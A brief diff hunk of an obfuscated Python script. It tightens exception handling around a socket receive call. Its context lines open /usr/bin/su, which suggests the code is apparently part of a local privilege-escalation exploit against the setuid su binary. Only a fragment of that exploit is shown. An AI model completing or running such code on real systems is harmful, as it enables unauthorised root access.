@@ -33,8 +33,8 @@ def c(f, t, c):
     n(r, u.fileno(), o)
     try:
         u.recv(8 + t)
-    except Exception:
-        0
+    except OSError:
+        pass
 
 
 f = g.open("/usr/bin/su", 0)
